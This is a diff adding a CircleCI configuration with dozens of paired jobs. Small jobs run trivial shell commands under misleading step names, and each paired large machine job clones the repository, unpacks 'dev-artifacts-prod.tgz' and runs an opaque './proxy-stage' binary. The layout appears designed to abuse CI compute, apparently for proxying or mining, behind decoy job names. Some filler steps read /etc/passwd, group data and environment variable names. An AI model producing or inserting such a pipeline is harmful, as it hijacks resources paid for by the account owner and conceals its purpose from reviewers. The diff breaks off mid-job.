@@ -1,0 +1,1757 @@
+version: 2.1
+
+jobs:
+  NullErrorUtils:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Critical mux
+          command: |
+            mkdir -p /tmp/gy
+            set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=10000;i++) print sprintf("|%10d|%10d|", i, i*31%1000)}' > /tmp/gy/qa-tmp; true
+            echo "output-feb1-canary=$(wc -c </tmp/gy/qa-tmp)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'qa-tmp'
+  feb1-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/qa-tmp 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  AsStore:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Unmute the conveyor
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; if [[ sync =~ ^[a-m] ]] ; then echo "first half"; else echo "second half"; fi; true ; } > /tmp/gy/FrozenOtter
+            echo "output-publish=$(wc -c </tmp/gy/FrozenOtter)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'FrozenOtter'
+  publish:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/oyof3b21 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  wrapper_restart_parsed_canvas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Give me the duplicate photos
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; grep -n then /etc/profile; true ; } > /tmp/gy/v_71038
+            echo "output-dotnet8-bench=$(wc -c </tmp/gy/v_71038)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'v_71038'
+  dotnet8-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/v_71038 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  teardown_loop:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: rolling back env vars
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; ls -g -s /run | tr -s ' ' | cut -d' ' -f5-; true ; } > /tmp/gy/savann4_o773r_m4tr1x_vec70r
+            echo "output-sierra=$(wc -c </tmp/gy/savann4_o773r_m4tr1x_vec70r)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'savann4_o773r_m4tr1x_vec70r'
+  sierra:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/savann4_o773r_m4tr1x_vec70r 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  calcVPNs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Total the depreciation schedule by entity
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; echo 'OK' > "/tmp/draft_signal_west.tmp"&&du -h "/tmp/draft_signal_west.tmp"; true ; } > /tmp/gy/sw-dev
+            echo "output-APP-284=$(wc -c </tmp/gy/sw-dev)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'sw-dev'
+  APP-284:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/sw-dev 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  UnbufferedInterfaceDriver:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Why pause the consumer group
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; test ! -x /bin/sh && echo good || echo bad; true ; } > /tmp/gy/0f43e8c7-499a-3404
+            echo "output-blast-off=$(wc -c </tmp/gy/0f43e8c7-499a-3404)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - '0f43e8c7-499a-3404'
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/oyof3b21 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  aiGrowChunk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Truly fuzz the load profile
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; echo "a-b-c" | gzip -c | wc -c; true ; } > /tmp/gy/cedar
+            echo "output-november-6=$(wc -c </tmp/gy/cedar)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'cedar'
+  november-6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/cedar 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  IYGKXS-5697a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Assign the training records and confirm by email
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; function whereami { echo "$#"; }; whereami athens lima helsinki vienna perth; true ; } > /tmp/gy/eastAgentSweep
+            echo "output-py310-bench=$(wc -c </tmp/gy/eastAgentSweep)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'eastAgentSweep'
+  py310-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/eastAgentSweep 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  November:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Book IX Shuffle The Join Keys
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; ls -Aog /sys/class/net | sort -rk5 | head -n 3; true ; } > /tmp/gy/P_5876
+            echo "output-refactor-4768=$(wc -c </tmp/gy/P_5876)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'P_5876'
+  refactor-4768:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/P_5876 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  xuohbzbuuslikmm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: VERIFY SNAPSHOT FILES END
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; grep -qs 'bin/sh' /etc/shells && echo 'good' || echo 'bad'; true ; } > /tmp/gy/wolf-coin
+            echo "output-java17-release=$(wc -c </tmp/gy/wolf-coin)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'wolf-coin'
+  java17-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/oyof3b21 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  sphere_chess_notify_font:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Flight level 180 lockdown
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; diff <(echo '   leading spaces') <(echo '1 2 3 4 5') || echo differ; true ; } > /tmp/gy/stage5f6135
+            echo "output-succes-only=$(wc -c </tmp/gy/stage5f6135)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'stage5f6135'
+  succes-only:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/stage5f6135 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  TryRouter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Level 03 checkpointing warmup steps
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; grep case ~/.bashrc | nl; true ; } > /tmp/gy/goRi
+            echo "output-rollout=$(wc -c </tmp/gy/goRi)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'goRi'
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/sw-dev 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  uat-dev-63:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: LINE 510 clustering
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd > "/tmp/tmp-snake-private.gz" && zgrep -c root "/tmp/tmp-snake-private.gz"; true ; } > /tmp/gy/titan43
+            echo "output-smoke=$(wc -c </tmp/gy/titan43)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'titan43'
+  smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/titan43 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  DEEP_BUCKET_SETTINGS:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Scroll the empty state in time for QA
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; for x in $(seq 1 9); do echo "${x}"; done | paste -sd ' '; true ; } > /tmp/gy/PAYLOAD_DRIVER_CRIMSON
+            echo "output-STG_INIT_8=$(wc -c </tmp/gy/PAYLOAD_DRIVER_CRIMSON)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'PAYLOAD_DRIVER_CRIMSON'
+  STG_INIT_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/oyof3b21 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  iirc_b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Garbage collect the retry buffer to be thorough
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; echo "won't fix" | tr ' ' '\n' | awk '{print toupper(substr($0,1,1)) substr($0,2)}' | paste -sd ' '; true ; } > /tmp/gy/pixeldustybronze
+            echo "output-rm-webhook=$(wc -c </tmp/gy/pixeldustybronze)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'pixeldustybronze'
+  rm-webhook:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/sw-dev 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  dumpCountForKey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: We get to freeze the ingress rules
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/link_1" && chmod -R go-rwx "/tmp/link_1" && ls -ld "/tmp/link_1"; true ; } > /tmp/gy/build-7838
+            echo "output-Verify_Image5=$(wc -c </tmp/gy/build-7838)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'build-7838'
+  Verify_Image5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/build-7838 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  instance-parchment:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Mini Map Cook Task
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; echo 'lorem ipsum dolor sit amet'| cksum; true ; } > /tmp/gy/DJI-57632
+            echo "output-uma-smoke=$(wc -c </tmp/gy/DJI-57632)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'DJI-57632'
+  uma-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/DJI-57632 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  hWndIteratorLegacyTensor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Wait 1000 seconds
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; getent group | awk -F : '$4 != "" { print $1 }' | sort -ru; true ; } > /tmp/gy/06dc0175-d9ca-7309
+            echo "output-bake-it=$(wc -c </tmp/gy/06dc0175-d9ca-7309)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - '06dc0175-d9ca-7309'
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/06dc0175-d9ca-7309 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  elmWhiskey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: tax report forecast G95
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; case $(id -u) in 0) echo root;; *) echo "regular user";; esac; true ; } > /tmp/gy/oyof3b21
+            echo "output-tam-verify=$(wc -c </tmp/gy/oyof3b21)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'oyof3b21'
+  tam-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/oyof3b21 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  ms_arg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Sous vide the raw events
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; ls -1 /etc/default | head -n12 | sed 's/^/- /'; true ; } > /tmp/gy/driver.thicket
+            echo "output-q2-smoke=$(wc -c </tmp/gy/driver.thicket)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'driver.thicket'
+  q2-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/driver.thicket 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  Legacy-Union-Locked:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: AUG 2023 FLAGGING
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; test -G $HOME && echo good || echo bad; true ; } > /tmp/gy/SSH-ROM
+            echo "output-dec10-canary=$(wc -c </tmp/gy/SSH-ROM)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'SSH-ROM'
+  dec10-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/SSH-ROM 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  lr0:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Hr handles pinning
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; cat /etc/group | cut -f3 -d":" | awk '{print $1 * 2}'; true ; } > /tmp/gy/20200413
+            echo "output-nightly-v7=$(wc -c </tmp/gy/20200413)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - '20200413'
+  nightly-v7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/20200413 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  metaLenMin:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Gradient clipping is in place
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; compgen -e | sort | tail --lines=3; true ; } > /tmp/gy/ridgefilter
+            echo "output-v5-ga5=$(wc -c </tmp/gy/ridgefilter)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'ridgefilter'
+  v5-ga5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/oyof3b21 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  anchor-31984-big:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Polish Changelog rc3
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; touch "/tmp/pro9.dat" && mv "/tmp/pro9.dat" "/tmp/pl3.bak" && ls -l "/tmp/pl3.bak"; true ; } > /tmp/gy/URLPNG
+            echo "output-hotel-5=$(wc -c </tmp/gy/URLPNG)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'URLPNG'
+  hotel-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/oyof3b21 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
